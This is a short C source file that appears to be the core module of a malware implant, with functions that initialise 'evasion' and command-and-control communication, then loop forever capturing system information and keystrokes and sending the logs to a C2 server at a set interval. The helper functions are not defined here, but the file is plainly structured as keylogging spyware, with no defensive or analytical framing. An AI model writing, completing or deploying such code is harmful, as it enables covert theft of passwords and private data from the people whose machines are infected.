#include "payload.h"
#include "payload_config.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void init_payload() {
    // Initialize payload components
    init_logging();
    init_evasion();
    init_c2_communication();
    
    log_message("Payload initialized successfully: %s v%s", PAYLOAD_NAME, PAYLOAD_VERSION);
}

void run_payload() {
    while (1) {
        // Main payload loop
        capture_system_info();
        capture_keystrokes();
        send_logs_to_c2();
        
        sleep(C2_INTERVAL);
    }
}

void cleanup_payload() {
    // Cleanup payload components
    cleanup_logging();
    cleanup_c2_communication();
    
    log_message("Payload cleaned up successfully");
}